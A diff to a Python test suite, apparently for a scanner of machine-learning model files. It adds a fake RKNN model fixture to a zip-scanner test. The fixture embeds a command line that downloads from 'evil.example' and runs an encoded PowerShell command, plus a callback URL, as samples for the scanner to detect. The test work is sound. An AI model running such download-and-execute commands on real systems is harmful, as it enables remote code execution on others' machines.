@@ -55,6 +55,14 @@ def _malicious_lightgbm_payload() -> bytes:
     )
 
 
+def _malicious_rknn_payload() -> bytes:
+    return (
+        b"RKNN\x01\x00\x00\x00"
+        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
+        b"callback=http://198.51.100.5:8080/collect\n"
+    )
+
+
 def test_rewrite_extracted_member_location_preserves_scanner_specific_suffix_policy() -> None:
     assert (
         rewrite_extracted_member_location(
@@ -1828,7 +1836,11 @@ class TestZipScanner:
 
     @pytest.mark.parametrize(
         ("scanner_name", "payload"),
-        [("cntk", _malicious_cntkv2_payload()), ("lightgbm", _malicious_lightgbm_payload())],
+        [
+            ("cntk", _malicious_cntkv2_payload()),
+            ("lightgbm", _malicious_lightgbm_payload()),
+            ("rknn", _malicious_rknn_payload()),
+        ],
     )
     def test_nested_member_routes_renamed_strict_signature_payload(
         self,
@@ -1853,6 +1865,7 @@ class TestZipScanner:
         [
             b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
             b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
+            b"RKNX\x01\x00\x00\x00runtime=rockchip\n",
         ],
     )
     def test_nested_member_rejects_renamed_signature_near_match(self, tmp_path: Path, payload: bytes) -> None:
